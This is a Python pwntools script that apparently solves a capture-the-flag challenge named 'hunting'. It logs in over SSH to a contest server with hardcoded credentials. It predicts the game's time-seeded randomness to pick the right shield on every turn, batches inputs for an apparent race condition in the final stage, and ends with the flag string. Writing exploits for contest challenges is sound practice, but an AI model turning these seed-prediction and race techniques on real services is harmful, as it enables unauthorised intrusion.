#!/usr/bin/env python2

from pwn import *
import re

###

if len(sys.argv) > 1:
    s = ssh(host='110.10.212.133', password='hunting', user='hunting', port=5556)
    DEBUG = False
else:
    DEBUG = True

context.log_level = 'info'
GDB = False

###

if DEBUG:
    r = process('./hunting')
else:
    r = s.run('/home/hunting/hunting')

def menu():
    global r
    return r.recvuntil('6. Exit')

def change_skill(idx):
    global r
    r.sendline('3')
    r.recvuntil('9. hollylight')
    r.sendline(str(idx))
    menu()

def attack(wait=True):
    global r
    global data
    global idx
    r.sendline('2') # use skill
    #if wait:
    r.recvuntil('Boss\'s hp is')
    hp = int(r.recvline().rstrip())
    log.info('Boss\'s HP: %d' % hp)
    a = r.recvuntil('=======================================')
    #else:
    #    a = r.recvuntil('3. windshield')
    if (int(data[idx]) & 3) == 1:
        r.sendline('3') # windshield
    elif int(data[idx]) & 3 == 2:
        r.sendline('2') # fireshield
    elif int(data[idx]) & 3 == 0:
        r.sendline('1') # iceshield
    else:
        r.sendline('2') # we don't care
    r.recvuntil('Your HP is ')
    my = int(r.recvline().rstrip())
    idx += 2
    return (a, my, menu())
    # You Win!

def get_def():
    global data
    global idx
    if (int(data[idx]) & 3) == 1:
        return '3\n' # windshield
    elif int(data[idx]) & 3 == 2:
        return '2\n' # fireshield
    elif int(data[idx]) & 3 == 0:
        return '1\n' # iceshield
    else:
        return '2\n' # we don't care

menu()
data = process('./a.out').recvall().rstrip().split('\n') # data is our randoms according to the time seed
idx = 1 # data idx
change_skill(3) # iceball
log.info('stage1')
ret = ''
while 'You Win!' not in ret:
    ret, my, z = attack()
    assert(my == 500) # check that our randoms are good
log.info('stage2')
ret = ''
while 'You Win!' not in ret:
    ret, my, z = attack()
    assert(my == 500) # check that our randoms are good
log.info('stage3')
ret = ''
while 'You Win!' not in ret:
    ret, my, z = attack()
    assert(my == 500) # check that our randoms are good
log.info('stage4')

# last stage needs to be send in 2 way
context.log_level = 'debug'

'''
this part of the sploit is quite messy because of the delay europeans
had on the server, so, it's awful to read. And I had to bruteforce to this point
cause there is some mistake on the random calculation there
'''

p = '3\n2\n' # switch to fireball
p += '2\n'
p += get_def()
idx += 2
r.send(p)

p = '3\n7\n' # switch to fireball
idx += 2
p += '2\n'
p += get_def()
idx += 2
r.send(p)

time.sleep(3)
r.interactive()

p = '3\n2\n' # switch to fireball
p += '2\n'
p += get_def()
idx += 2
r.send(p)

p = '3\n7\n' # switch to fireball
idx += 2
p += '2\n'
p += get_def()
idx += 2
r.send(p)

r.interactive()

# s1mp13_rac3_c0nd1t10n_gam3_
